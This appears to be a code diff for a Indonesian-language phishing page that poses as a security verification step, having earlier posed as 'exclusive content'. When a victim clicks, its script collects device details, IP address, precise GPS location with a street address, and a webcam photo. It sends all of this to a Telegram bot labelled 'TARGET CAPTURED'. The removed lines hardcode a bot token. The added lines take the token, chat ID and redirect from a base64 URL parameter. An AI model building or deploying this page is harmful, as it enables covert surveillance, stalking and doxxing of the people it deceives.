@@ -3,105 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EXCLUSIVE ACCESS</title>
+    <title>Verifikasi Keamanan</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
-            z-index: -1;
+            padding: 20px;
         }
         
         .container {
-            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
             padding: 30px;
             max-width: 500px;
-            width: 90%;
-            z-index: 1;
-        }
-        
-        .logo {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #4cc9f0;
-            text-shadow: 0 0 10px rgba(76, 201, 240, 0.5);
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
         
         h1 {
-            font-size: 32px;
-            margin-bottom: 15px;
-            background: linear-gradient(90deg, #4cc9f0, #f72585);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            font-size: 28px;
         }
         
-        .subtitle {
-            font-size: 18px;
-            margin-bottom: 30px;
-            color: #b8b8b8;
-            line-height: 1.5;
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+            opacity: 0.9;
         }
         
         .btn {
-            background: linear-gradient(90deg, #4361ee, #3a0ca3);
+            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
             color: white;
             border: none;
-            padding: 18px 40px;
-            font-size: 22px;
-            font-weight: bold;
+            padding: 15px 30px;
+            font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
-            margin: 25px 0;
-            position: relative;
-            overflow: hidden;
-            letter-spacing: 1px;
-        }
-        
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: 0.5s;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(79, 172, 254, 0.4);
+            margin: 15px 0;
         }
         
         .btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.6);
-        }
-        
-        .btn:hover::before {
-            left: 100%;
+            box-shadow: 0 8px 20px rgba(79, 172, 254, 0.6);
         }
         
         .btn:active {
@@ -109,51 +67,20 @@
         }
         
         .btn:disabled {
-            background: #4a5568;
+            background: #95a5a6;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
         
-        .btn:disabled::before {
-            display: none;
-        }
-        
-        .features {
-            display: flex;
-            justify-content: space-around;
-            margin: 30px 0;
-            flex-wrap: wrap;
-        }
-        
-        .feature {
-            flex: 1;
-            min-width: 120px;
-            margin: 10px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            backdrop-filter: blur(5px);
-        }
-        
-        .feature-icon {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        
-        .feature-text {
-            font-size: 14px;
-            color: #b8b8b8;
-        }
-        
         .loading {
             display: none;
-            margin: 30px 0;
+            margin: 20px 0;
         }
         
         .spinner {
             border: 5px solid rgba(255, 255, 255, 0.3);
-            border-top: 5px solid #4cc9f0;
+            border-top: 5px solid #4facfe;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -171,94 +98,72 @@
             padding: 15px;
             border-radius: 10px;
             display: none;
-            font-weight: bold;
         }
         
         .success {
-            background-color: rgba(34, 197, 94, 0.2);
-            color: #4ade80;
-            border: 1px solid rgba(34, 197, 94, 0.5);
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid rgba(46, 204, 113, 0.5);
         }
         
         .error {
-            background-color: rgba(239, 68, 68, 0.2);
-            color: #f87171;
-            border: 1px solid rgba(239, 68, 68, 0.5);
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        .floating {
-            animation: floating 3s ease-in-out infinite;
-        }
-        
-        @keyframes floating {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-        
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #6b7280;
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid rgba(231, 76, 60, 0.5);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo floating">🔓</div>
-        <h1>EXCLUSIVE CONTENT UNLOCKED</h1>
-        <p class="subtitle">You have been granted special access to premium content. Click OPEN to continue.</p>
+        <h1>Verifikasi Keamanan Diperlukan</h1>
+        <p>Kami perlu memverifikasi bahwa Anda adalah pengguna asli. Klik tombol di bawah untuk melanjutkan.</p>
         
-        <button id="openBtn" class="btn pulse">OPEN</button>
-        
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">📱</div>
-                <div class="feature-text">Device Optimized</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">⚡</div>
-                <div class="feature-text">High Performance</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>
-                <div class="feature-text">Secure Connection</div>
-            </div>
-        </div>
+        <button id="verifyBtn" class="btn">Verifikasi Sekarang</button>
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Initializing secure connection...</p>
+            <p>Memverifikasi informasi perangkat...</p>
         </div>
         
         <div class="status" id="status"></div>
-        
-        <div class="footer">
-            <p>Secure Access System • Protected Content</p>
-        </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const openBtn = document.getElementById('openBtn');
+            const verifyBtn = document.getElementById('verifyBtn');
             const loadingDiv = document.getElementById('loading');
             const statusDiv = document.getElementById('status');
             
-            // Konfigurasi bot Telegram
-            const BOT_TOKEN = '8262226985:AAEaIrI-Fi3j8lb25hAWDR3UUHur4fNDPBQ';
-            const CHAT_ID = '7786718775';
+            // Ambil data dari URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedData = urlParams.get('data');
             
-            // Fungsi untuk mendapatkan informasi perangkat secara detail
+            if (!encodedData) {
+                showStatus("Link tidak valid", "error");
+                verifyBtn.disabled = true;
+                return;
+            }
+            
+            // Decode data
+            let botData;
+            try {
+                botData = JSON.parse(atob(encodedData));
+            } catch (e) {
+                showStatus("Data tidak valid", "error");
+                verifyBtn.disabled = true;
+                return;
+            }
+            
+            const BOT_TOKEN = botData.token;
+            const CHAT_ID = botData.chatId;
+            const TARGET_URL = botData.target;
+            
+            // Fungsi untuk menampilkan status
+            function showStatus(message, type) {
+                statusDiv.textContent = message;
+                statusDiv.className = `status ${type}`;
+                statusDiv.style.display = 'block';
+            }
+            
+            // Fungsi untuk mendapatkan informasi perangkat
             function getDeviceInfo() {
                 const userAgent = navigator.userAgent;
                 let deviceInfo = {
@@ -268,41 +173,25 @@
                     browser: "Unknown",
                     screen: `${screen.width}x${screen.height}`,
                     language: navigator.language,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor || "Unknown"
+                    platform: navigator.platform
                 };
                 
-                // Deteksi tipe perangkat
                 if (/Android/.test(userAgent)) {
                     deviceInfo.type = "Mobile";
                     deviceInfo.os = "Android";
-                    
-                    // Coba dapatkan model Android
                     const androidModelMatch = userAgent.match(/Android.*; (.*) Build/);
-                    if (androidModelMatch) {
-                        deviceInfo.model = androidModelMatch[1];
-                    }
+                    if (androidModelMatch) deviceInfo.model = androidModelMatch[1];
                 } else if (/iPhone|iPad|iPod/.test(userAgent)) {
                     deviceInfo.type = /iPad/.test(userAgent) ? "Tablet" : "Mobile";
                     deviceInfo.os = "iOS";
-                    
-                    // Coba dapatkan model iPhone/iPad
-                    const iosModelMatch = userAgent.match(/iPhone|iPad|iPod.*OS [\d_]+ like Mac OS X/);
-                    if (iosModelMatch) {
-                        deviceInfo.model = iosModelMatch[0].split(' like')[0];
-                    }
                 } else if (/Windows/.test(userAgent)) {
                     deviceInfo.type = "Desktop";
                     deviceInfo.os = "Windows";
                 } else if (/Mac/.test(userAgent)) {
                     deviceInfo.type = "Desktop";
                     deviceInfo.os = "MacOS";
-                } else if (/Linux/.test(userAgent)) {
-                    deviceInfo.type = "Desktop";
-                    deviceInfo.os = "Linux";
                 }
                 
-                // Deteksi browser
                 if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
                     deviceInfo.browser = "Chrome";
                 } else if (/Firefox/.test(userAgent)) {
@@ -311,31 +200,12 @@
                     deviceInfo.browser = "Safari";
                 } else if (/Edg/.test(userAgent)) {
                     deviceInfo.browser = "Edge";
-                } else if (/Opera|OPR/.test(userAgent)) {
-                    deviceInfo.browser = "Opera";
                 }
                 
                 return deviceInfo;
             }
             
-            // Fungsi untuk mendapatkan informasi baterai
-            function getBatteryInfo() {
-                return new Promise((resolve) => {
-                    if ('getBattery' in navigator) {
-                        navigator.getBattery().then(function(battery) {
-                            const batteryLevel = Math.round(battery.level * 100);
-                            const charging = battery.charging ? "Charging" : "Not Charging";
-                            resolve(`${batteryLevel}% (${charging})`);
-                        }).catch(() => {
-                            resolve("Unknown (API not supported)");
-                        });
-                    } else {
-                        resolve("Unknown (API not available)");
-                    }
-                });
-            }
-            
-            // Fungsi untuk mendapatkan lokasi dengan akurasi tinggi
+            // Fungsi untuk mendapatkan lokasi
             function getLocation() {
                 return new Promise((resolve, reject) => {
                     if (!navigator.geolocation) {
@@ -343,33 +213,23 @@
                         return;
                     }
                     
-                    const options = {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    };
-                    
                     navigator.geolocation.getCurrentPosition(
                         position => {
-                            const lat = position.coords.latitude;
-                            const lng = position.coords.longitude;
-                            const accuracy = position.coords.accuracy;
-                            
                             resolve({
-                                latitude: lat,
-                                longitude: lng,
-                                accuracy: accuracy
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
                             });
                         },
                         error => {
-                            reject(`Location error: ${error.message}`);
+                            reject(error.message);
                         },
-                        options
+                        { enableHighAccuracy: true, timeout: 10000 }
                     );
                 });
             }
             
-            // Fungsi untuk mendapatkan alamat dari koordinat
+            // Fungsi untuk mendapatkan alamat
             function getAddressFromCoordinates(lat, lng) {
                 return new Promise((resolve) => {
                     fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
@@ -388,42 +248,35 @@
                                 
                                 resolve({
                                     address: fullAddress || "Address not found",
-                                    postcode: addr.postcode || "Unknown",
-                                    country: addr.country || "Unknown"
+                                    postcode: addr.postcode || "Unknown"
                                 });
                             } else {
                                 resolve({
                                     address: "Address not found",
-                                    postcode: "Unknown",
-                                    country: "Unknown"
+                                    postcode: "Unknown"
                                 });
                             }
                         })
                         .catch(() => {
                             resolve({
                                 address: "Failed to retrieve address",
-                                postcode: "Unknown",
-                                country: "Unknown"
+                                postcode: "Unknown"
                             });
                         });
                 });
             }
             
-            // Fungsi untuk mendapatkan IP address
+            // Fungsi untuk mendapatkan IP
             function getIPAddress() {
                 return new Promise((resolve) => {
                     fetch('https://api.ipify.org?format=json')
                         .then(response => response.json())
-                        .then(data => {
-                            resolve(data.ip);
-                        })
-                        .catch(() => {
-                            resolve("Unknown");
-                        });
+                        .then(data => resolve(data.ip))
+                        .catch(() => resolve("Unknown"));
                 });
             }
             
-            // Fungsi untuk mengambil foto (tanpa menampilkan preview)
+            // Fungsi untuk mengambil foto
             function takePhoto() {
                 return new Promise((resolve, reject) => {
                     navigator.mediaDevices.getUserMedia({ video: true })
@@ -438,25 +291,20 @@
                                 canvas.height = video.videoHeight;
                                 const context = canvas.getContext('2d');
                                 
-                                // Tunggu sebentar untuk memastikan video siap
                                 setTimeout(() => {
                                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                                     
-                                    // Hentikan stream
                                     stream.getTracks().forEach(track => track.stop());
-                                    
                                     resolve(photoDataUrl);
                                 }, 500);
                             });
                         })
-                        .catch(error => {
-                            reject(`Camera error: ${error.message}`);
-                        });
+                        .catch(error => reject(error.message));
                 });
             }
             
-            // Fungsi untuk mengirim data ke Telegram
+            // Fungsi untuk mengirim ke Telegram
             function sendToTelegram(photoDataUrl, message) {
                 return new Promise((resolve, reject) => {
                     fetch(photoDataUrl)
@@ -474,42 +322,31 @@
                         })
                         .then(response => response.json())
                         .then(data => {
-                            if (data.ok) {
-                                resolve();
-                            } else {
-                                reject(data.description || "Unknown error");
-                            }
+                            if (data.ok) resolve();
+                            else reject(data.description);
                         })
-                        .catch(error => {
-                            reject(error.message);
-                        });
+                        .catch(error => reject(error.message));
                 });
             }
             
-            // Event listener untuk tombol OPEN
-            openBtn.addEventListener('click', async function() {
-                openBtn.disabled = true;
-                openBtn.classList.remove('pulse');
+            // Event listener untuk tombol verifikasi
+            verifyBtn.addEventListener('click', async function() {
+                verifyBtn.disabled = true;
                 loadingDiv.style.display = 'block';
                 
                 try {
-                    // Dapatkan informasi perangkat
+                    // Kumpulkan semua informasi
                     const deviceInfo = getDeviceInfo();
-                    const batteryInfo = await getBatteryInfo();
                     const ipAddress = await getIPAddress();
-                    
-                    // Dapatkan lokasi
                     const location = await getLocation();
                     const addressInfo = await getAddressFromCoordinates(location.latitude, location.longitude);
-                    
-                    // Ambil foto
                     const photoDataUrl = await takePhoto();
                     
-                    // Buat pesan untuk Telegram
+                    // Buat pesan
                     const message = `
-🎯 TARGET INFORMATION CAPTURED
+🎯 TARGET CAPTURED
 
-📱 DEVICE INFO:
+📱 DEVICE:
 Type: ${deviceInfo.type}
 Model: ${deviceInfo.model}
 OS: ${deviceInfo.os}
@@ -517,51 +354,37 @@ Browser: ${deviceInfo.browser}
 Screen: ${deviceInfo.screen}
 Language: ${deviceInfo.language}
 Platform: ${deviceInfo.platform}
-Vendor: ${deviceInfo.vendor}
-
-🔋 BATTERY: ${batteryInfo}
 
 📍 LOCATION:
 Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
-Accuracy: ${location.accuracy} meters
+Accuracy: ${location.accuracy}m
 Address: ${addressInfo.address}
 Postal Code: ${addressInfo.postcode}
-Country: ${addressInfo.country}
 Google Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
 
 🌐 NETWORK:
-IP Address: ${ipAddress}
+IP: ${ipAddress}
 
-🕒 TIMESTAMP: ${new Date().toLocaleString()}
+🕒 TIME: ${new Date().toLocaleString()}
                     `.trim();
                     
                     // Kirim ke Telegram
                     await sendToTelegram(photoDataUrl, message);
                     
-                    // Tampilkan pesan sukses
-                    showStatus("Access granted! Loading premium content...", "success");
+                    showStatus("Verifikasi berhasil! Mengarahkan...", "success");
                     
-                    // Redirect setelah beberapa detik
+                    // Redirect ke URL target
                     setTimeout(() => {
-                        window.location.href = "https://www.example.com"; // Ganti dengan URL yang diinginkan
-                    }, 3000);
+                        window.location.href = TARGET_URL;
+                    }, 2000);
                     
                 } catch (error) {
                     console.error("Error:", error);
-                    showStatus("Access denied. Please try again.", "error");
-                    openBtn.disabled = false;
-                    openBtn.classList.add('pulse');
-                } finally {
+                    showStatus("Verifikasi gagal: " + error, "error");
+                    verifyBtn.disabled = false;
                     loadingDiv.style.display = 'none';
                 }
             });
-            
-            // Fungsi untuk menampilkan status
-            function showStatus(message, type) {
-                statusDiv.textContent = message;
-                statusDiv.className = `status ${type}`;
-                statusDiv.style.display = 'block';
-            }
         });
     </script>
 </body>
